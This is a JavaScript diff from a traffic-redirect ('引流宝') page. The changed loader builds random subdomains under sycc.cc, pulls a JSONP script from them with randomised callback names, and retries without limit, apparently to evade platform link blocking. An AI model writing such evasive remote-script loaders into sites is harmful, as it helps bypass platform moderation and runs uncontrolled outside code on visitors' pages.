@@ -224,24 +224,39 @@
                 document.body.innerHTML = '<h3>参数为空</h3>';
                 return;
             }
+            // 修改域名和目录（请确保已经配置了SSL）
+            // 假设你的域名是：www.baidu.com
+            // 你将引流宝安装在根目录，则将{域名}替换为 www.baidu.com
+            // 如果安装在二级目录，需加上二级目录名，例如二级目录名为ylb
+            // 则将{域名}替换为 www.baidu.com/ylb
+            // -------------------------------------------------------------------
+            // 文档：https://viusosibp88.feishu.cn/docx/JJVwdZ3aQoh6btxqCWCc2gYjnPe
+            // -------------------------------------------------------------------
+            
             // --- 语义化子域名生成策略 ---
-            const randomAdjective = adjectives[Math.floor(Math.random() * adjectives.length)];
-            const randomNoun = nouns[Math.floor(Math.random() * nouns.length)];
-            const randomSubdomain = `${randomAdjective}-${randomNoun}`;
-            const apiUrl = `https://${randomSubdomain}.sycc.cc/common/wxdmqkCallBack/?key=${key}`;
+            // 单词列表已从 "words.js" 中加载
 
-            // 自动重试机制
-            let retryCount = 0;
-            const maxRetries = 4; // 最大重试次数
-            const retryDelay = [800, 1500, 2500, 4000]; // 每次重试的延迟（毫秒）
+            let loaded = false;
+            const retryDelay = 800; // 每次重试间隔（毫秒）
 
             function tryLoad() {
+                if (loaded) return; // 已经成功就不再重试
+                // 1. 从每个列表中随机选择一个单词
+                const randomAdjective = adjectives[Math.floor(Math.random() * adjectives.length)];
+                const randomNoun = nouns[Math.floor(Math.random() * nouns.length)];
+                // 2. 组合成子域名
+                const randomSubdomain = `${randomAdjective}-${randomNoun}`;
+                // 3. 拼接成最终的请求URL
+                const apiUrl = `https://${randomSubdomain}.sycc.cc/common/wxdmqkCallBack/?key=${key}`;
+                // 4. JSONP回调名随机化
                 const randomCallbackName = 'cb_' + Math.random().toString(36).substring(2, 10);
+
                 window[randomCallbackName] = function(response) {
                     if (response && response.code === 0) {
+                        loaded = true;
                         handleResponse(response);
                     } else {
-                        retryOrFail();
+                        setTimeout(tryLoad, retryDelay);
                     }
                     try { delete window[randomCallbackName]; } catch (e) { window[randomCallbackName] = undefined; }
                 };
@@ -250,19 +265,9 @@
                 const script = document.createElement('script');
                 script.src = `${apiUrl}&callback=${randomCallbackName}`;
                 script.onerror = function() {
-                    retryOrFail();
+                    setTimeout(tryLoad, retryDelay);
                 };
                 document.body.appendChild(script);
-            }
-
-            function retryOrFail() {
-                retryCount++;
-                if (retryCount <= maxRetries) {
-                    setTimeout(tryLoad, retryDelay[retryCount - 1] || 2000);
-                } else {
-                    document.title = '提示';
-                    document.body.innerHTML = '<h3>' + getRandomErrorTip() + '</h3>';
-                }
             }
 
             tryLoad();
